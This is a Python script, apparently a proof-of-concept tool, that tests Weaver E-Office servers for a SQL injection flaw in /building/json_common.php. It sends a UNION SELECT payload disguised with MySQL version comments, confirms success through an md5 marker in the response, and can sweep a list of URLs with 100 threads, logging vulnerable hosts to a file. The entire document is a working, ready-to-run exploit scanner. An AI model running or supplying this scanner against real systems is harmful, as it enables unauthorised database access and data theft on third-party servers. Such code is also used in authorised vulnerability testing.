# E-office SQL注入漏洞
import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错

# 指纹模块
def banner():
    banner = """
  ______       ____   __  __ _          
 |  ____|     / __ \ / _|/ _(_)         
 | |__ ______| |  | | |_| |_ _  ___ ___ 
 |  __|______| |  | |  _|  _| |/ __/ _ \
 | |____     | |__| | | | | | | (_|  __/
 |______|     \____/|_| |_| |_|\___\___|
                                        
                                         
                                     ░                                                        
                    author:           guoguo12138
                    version:          1.0.5
                    For:              E-OFFICE sql注入漏洞 
"""
    print(banner)

# poc模块
def main():
    # banner()
    parser = argparse.ArgumentParser(description="泛微E-Office json_common.php SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='intput link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload_url = '/building/json_common.php'
    url = target + payload_url
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": "LOGIN_LANG=cn; PHPSESSID=bd702adc830fba4fbcf5f336471aeb2e",
        "DNT": "1",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "82",
    }
    data = "tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(0921) ,4#|2|333"
    try:
        res1 = requests.get(url=target, timeout=10, verify=False)
        if res1.status_code == 200:
            res2 = requests.post(url=target+payload_url, headers=header, data=data, verify=False)
            if "430c3626b879b4005d41b8a46172e0c0" in res2.text:
                print(f"[+] 该url{target}存在信息泄露")
                with open("result.txt", "a") as fp:
                    fp.write(f"{target}" + "\n")
            else:
                print(f"[-] 该url{target}不存在信息泄露")
    except Exception as e:
        print(f'[*] 该url{target}可能存在访问问题，请手工测试')

if __name__ == '__main__':
    main()